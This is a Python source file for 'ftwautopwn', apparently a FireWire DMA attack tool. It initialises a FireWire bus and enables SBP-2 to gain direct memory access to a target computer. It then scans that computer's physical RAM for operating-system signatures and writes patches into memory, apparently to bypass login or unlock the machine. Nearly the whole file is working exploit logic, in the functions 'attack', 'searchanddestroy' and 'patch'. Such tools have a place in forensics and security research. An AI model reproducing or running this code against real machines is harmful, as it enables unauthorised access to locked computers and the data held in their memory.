'''
Created on Jun 23, 2011

@author: carmaa
'''
from binascii import hexlify, unhexlify
from forensic1394 import Bus
from ftwautopwn.util import msg, clean_hex, all_equal, select, MemoryFile
from time import sleep

import sys
import math
import ftwautopwn.settings as settings
from pprint import pprint


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if not selected: selected = input('Please select target (or enter \'q\' to quit): ')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            msg('!', 'Invalid selection, please try again. Type \'q\' to quit.')
            return select_target(targets)
    if selected <= nof_targets: return targets[selected - 1]
    else:
        msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit.')
        return select_target(targets)


def initfw():
    '''
    Initializes FireWire and waits for SBP-2
    '''
    b = Bus()
    # TODO: Check that we are connected and can see a FW unit directory
    # TODO: Drop enabling SBP-2 if target is OS X
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    try:
        for i in range(settings.fw_delay, 0, -1):
            sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C\r' % i)
            sys.stdout.flush()
            sleep(1)
    except KeyboardInterrupt:
        msg('!', 'Interrupted')
        pass
    # TODO: Make sure that we actually have devices, plus error checking 
    # Open the first device
    d = b.devices()[0]
    d.open()
    print() # Create a newline so that next call to print() will start on a new line
    return d


def findmemsize(d):
    '''
    Iterate through possible memory sizes and check if we get data when reading.
    Assuming minimum memory unit size is 128 MiB, this should be a reasonably
    safe assumption nowadays
    '''
    # TODO: Fix this method
    step = 128 * settings.MiB
    chunk = settings.PAGESIZE # Read page sized chunks of data
    for addr in range(settings.memsize, 0, -step):
        buf = d.read(addr - chunk, chunk)
        if buf:
            return addr
    return None

def getsiglength(l):
    '''
    Accepts integers and dicts with key 'internaloffset', and calculates
    the length of the total signature in number of bytes in a tuple with a
    boolean that indicates whether the signature is single or not
    '''
    index = value = 0
    for i in range(len(l)):
        if l[i]['internaloffset'] > value:
            value = l[i]['internaloffset']
            index = i
            
    return (len(hex(l[index]['chunk'])) - 2) // 2 + value

def int2binhex(i):
    '''
    Converts an integer to its binary hexadecimal representation
    '''
    return clean_hex(hex(i))


def match(candidate, chunks):
    '''
    Matches a candidate read from memory with the signature chunks
    '''
    for c in chunks:
        ioffset = c['internaloffset']
        if c['chunk'] != candidate[ioffset:ioffset + len(c['chunk'])]:
            return False
    return True
    

def patch(device, address, chunks):
    '''
    Writes back to the device at address, using the patches in the signature
    chunks
    '''
    success = True
    for c in chunks:
        patch = c['patch']
        ioffset = c['internaloffset']
        poffset = c['patchoffset']
        if not poffset: 
            poffset = 0
        realaddress = address + ioffset + poffset
        if patch:
            device.write(realaddress, patch)
            if device.read(realaddress, len(patch)) != patch:
                success = False
    return success
        

def searchanddestroy(device, target, memsize):
    '''
    Main search loop
    '''
    # TODO: Create support for other page sizes (2 GiB for Macs)
    pageaddress = settings.MiB
    signatures = target['signatures']

    # Add signature lengths in bytes to the dictionary, and replace integer
    # representations of the signatures and patches with bytes
    for signature in signatures:
        signature['length'] = getsiglength(signature['chunks'])
        offsets = signature['offsets'] # Offsets within pages
        for chunk in signature['chunks']:
            chunk['chunk'] = int2binhex(chunk['chunk'])
            chunk['patch'] = int2binhex(chunk['patch'])

    try:
        # Build a batch of read requests of the form: [(addr1, len1), ...] and
        # a corresponding match vector: [(chunks1, patchoffset1), ...]
        j = 0
        count = 0
        cand = b'\x00'
        r = []
        p = []
        while pageaddress < memsize:
            sig_len = len(signatures)
            
            for i in range(sig_len): # Iterate over signatures
                offsets = signatures[i]['offsets'] # Offsets within pages
                if isinstance(offsets, int):
                    offsets = [offsets] # Create a list if single offset
                chunks = signatures[i]['chunks'] # The chunks that is the sig
                length = signatures[i]['length'] # Sig length in bytes
                offset_len = len(offsets)
                
                for n in range(offset_len): # Iterate over offsets
                    address = pageaddress + offsets[n] + settings.PAGESIZE * j
                    r.append((address, length))
                    p.append(chunks)
                    count += 1
   
                    # If we have built a full vector, read from memory and
                    # compare to the corresponding signatures
                    if count == settings.vectorsize:
                        # Read data from device
                        m = 0
                        for caddr, cand  in device.readv(r):
                            if match(cand, p[m]):
                                return (caddr, p[m])
                            m += 1                    
                        # Jump to next pages (we're finished with these)
                        address, ignore = r[-1]
                        mask = ~(settings.PAGESIZE - 0x01)
                        pageaddress = address & mask
                        if sig_len == i and offset_len == n:
                            pageaddress = pageaddress + settings.PAGESIZE
                        # Zero out counters and vectors
                        j = 0
                        count = 0
                        r = []
                        p = []
                        # Print status
                        mibaddr = math.floor((pageaddress) / (settings.MiB))
                        sys.stdout.write('[*] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
                        if settings.verbose:
                            sys.stdout.write(' Data read: 0x{0}'.format(hexlify(cand).decode(settings.encoding)))
                        sys.stdout.write('\r')
                        sys.stdout.flush()
                         
            j += 1 # Increase read request count
            
    except IOError:
        print()
        msg('!', 'I/O Error, make sure FireWire interfaces are properly '\
                 'connected.')


def attack(targets):
    '''
    Main attack logic
    '''
    # TODO: Detect targets

    # If not detected, list targets
    for number, target in enumerate(targets, 1):
                msg(number, target['OS'] + ': ' + target['name'])
    
    # Select target
    target = select_target(targets)
    
    # Print selection. If verbose, print selection with signatures
    msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
    if settings.verbose:
        msg('*', 'The attack contains the following signatures:')
        print()
        # TODO: Create a pretty print method that can print this in a fashionable way
        pprint(target['signatures'])
        print()
    
    # Initialize and lower DMA shield
    device = None
    if settings.filemode:
        device = MemoryFile(settings.filename, settings.PAGESIZE)
    else:
        device = initfw()
    
    # Check that we have DMA
    # TODO: Create method that checks that we are connected (use isStale())?
    
    # Determine memory size and set to default if not found
    memsize = findmemsize(device)
    if not memsize:
        # TODO: Create a select() method that can cope with defaults
        cont = input('[-] Could not determine memory size: DMA shield may still be up. Try increasing the\n'\
                     '    delay after enabling SBP2 (-d switch). Do you want to continue and use the FireWire\n'\
                     '    maximum addressable limit (4 GiB) as memory size? [y/N]:')
        if cont in ['y', 'Y']:
            memsize = settings.memsize
        else:
            fail()
    else:
        msg('*', 'Found memory size: ' + str(memsize/settings.MiB) + ' MiB. Shields down.')
    
    # Perform parallel search for all signatures for each OS at the known offsets
    msg('*', 'Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Sequential search
        fail('Could not locate signature(s).')
    
    # Signature found, let's patch
    msg('+', 'Signature found at 0x%x.' % address)
    if not settings.dry_run:
        success = patch(device, address, chunks)
        if success:
            msg('+', 'Write-back verified; patching successful.')
        else:
            msg('-', 'Write-back could not be verified; patching unsuccessful.')
    

def fail(err = None):
    '''
    Called if FTWA fails. Optional parameter is an error message string.
    '''
    if err: msg('!', err)
    print('[!] Attack unsuccessful.')
    sys.exit(1)